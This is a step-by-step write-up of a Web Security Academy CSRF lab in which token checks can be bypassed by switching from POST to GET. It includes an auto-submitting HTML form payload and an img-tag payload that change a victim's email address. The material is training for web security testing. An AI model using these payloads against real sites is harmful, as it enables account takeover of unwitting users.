# CSRF LAB 02 - CSRF where token validation depends on request method

## Manual Solution

- Open the Web Security Academy lab environment in your browser.
- Log in with the credentials: username:wiener password:peter.
- Open your browserâ€™s Developer Tools and switch to the Network tab.
- While logged in attempt to change your email address from the account settings page.
- Observe the request sent to the /my-account/change-email endpoint.
- Notice that the request contains a `CSRF` token.
- Go to the Exploit Server and paste the following HTML payload into the body of the page:
```html
    <html>
        <body>
            <form action="https://[YOUR_LAB_ID].web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="hacker@hacker.com">
            </form>

            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```
- Click the view exploit button.
- An error message appears `"Missing parameter 'csrf'"`
- Go back to the My Account page and paste the following URL:
`https://[YOUR_LAB_ID].web-security-academy.net/my-account/change-email?email=example@example.com`
- Notice that the email address has changed. This shows that a CSRF attack can be performed using a GET request.
- Go to the Exploit Server and paste the following HTML payload into the body of the page:
```html
<img src = "https://[YOUR_LAB_ID].web-security-academy.net/my-account/change-email?email=example@example.com">
```
- Save and deliver the exploit to the victim.
